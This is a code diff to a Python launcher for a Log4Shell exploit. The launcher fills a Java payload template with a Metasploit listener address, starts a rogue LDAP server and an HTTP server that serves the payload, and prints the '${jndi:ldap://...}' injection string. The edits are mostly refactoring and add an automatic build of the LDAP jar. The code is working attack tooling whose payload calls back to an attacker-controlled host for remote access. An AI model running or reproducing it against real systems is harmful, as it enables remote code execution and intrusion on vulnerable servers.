@@ -25,17 +25,28 @@ def ensure_dir_exists(dir_name):
         print(f'Error unable to create dir : {dir_name} .......exiting')
         sys.exit(1)
 
+def ensure_l4sutils_are_built(jar_file):
+    if os.path.isfile(jar_file):
+        return 
+    print("building l4sutils.jar...this may take a few minutes")
+    subprocess.call(["sh", "-c", "./build_l4sutils.sh"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    print("just returned from calling build_l4sutils.sh")
+    if not os.path.isfile(jar_file):
+        # if here then the build failed
+        print("executing build_l4sutils.sh failed.....exiting")
+        sys.exit(1)
+                
 def run_mini_met(http_ip, http_port, msf_ip, msf_port, ldap_port):
     f = "MiniMet"
 
     check_if_installed("java")
     check_if_installed("javac")
-    check_if_installed("mvn");
+    check_if_installed("mvn")
 
     # writing the exploit to Exploit.java file
     try:
-        ensure_dir_exists("build_tmp");
-        ensure_dir_exists("wwwroot");
+        ensure_dir_exists("build_tmp")
+        ensure_dir_exists("wwwroot")
 
         with open(f'exploits/{f}.java', "r") as template:
             source = template.read().replace("<MSF_IP>", msf_ip).replace("<MSF_PORT>", str(msf_port))
@@ -51,19 +62,9 @@ def run_mini_met(http_ip, http_port, msf_ip, msf_port, ldap_port):
 
     print('Setting up the LDAP and web server.', end="\n\n")
     # create the LDAP server on new thread
-    t1 = threading.Thread(target=create_ldap_server, args=(ldap_port, http_ip, http_port))
+    t1 = threading.Thread(target=create_ldap_server, args=(ldap_port, http_ip, http_port, f))
     t1.start()
-    print("---------------------------")
-    print('${jndi:ldap://%s:%s/#%s}' % (http_ip, ldap_port, f))
-    print("---------------------------")
     
-#    class Handler(SimpleHTTPRequestHandler):
-#        def translate_path(self, path):
-#            path = super().translate_path(path)
-#            relpath = os.path.relpath(path, os.getcwd())
-#            return os.path.join("wwwroot", relpath)
-#
-
     class Handler(SimpleHTTPRequestHandler):
         def __init__(self, *args, **kwargs):
             super().__init__(*args, directory="wwwroot", **kwargs)
@@ -74,10 +75,15 @@ def run_mini_met(http_ip, http_port, msf_ip, msf_port, ldap_port):
         httpd.serve_forever()
 
 
-def create_ldap_server(ldap_port, http_ip, http_port):
-    ip = http_ip
+def create_ldap_server(ldap_port, http_ip, http_port, f):
+    jar_file =  "l4sutils/target/l4sutils-0.1-all.jar"
+    ensure_l4sutils_are_built(jar_file)
+    print("---------------------------")
+    print('${jndi:ldap://%s:%s/#%s}' % (http_ip, ldap_port, f))
+    print("---------------------------")
+
     url = f"http://{http_ip}:{http_port}/"
-    subprocess.run(["java", "-jar", "l4sutils/target/LDAPServer-0.1-all.jar", url, str(ldap_port)])
+    subprocess.run(["java", "-jar", jar_file, url, str(ldap_port)])
 
 if __name__ == "__main__":
     try:
@@ -103,5 +109,5 @@ if __name__ == "__main__":
         print("about to start.....")
         run_mini_met(args.http_ip, args.http_port, args.msf_ip, args.msf_port, args.ldap_port)
     except KeyboardInterrupt:
-        print(Fore.RED + "[EXIT] User interrupted the program.")
+        print("[EXIT] User interrupted the program.")
         sys.exit(0)
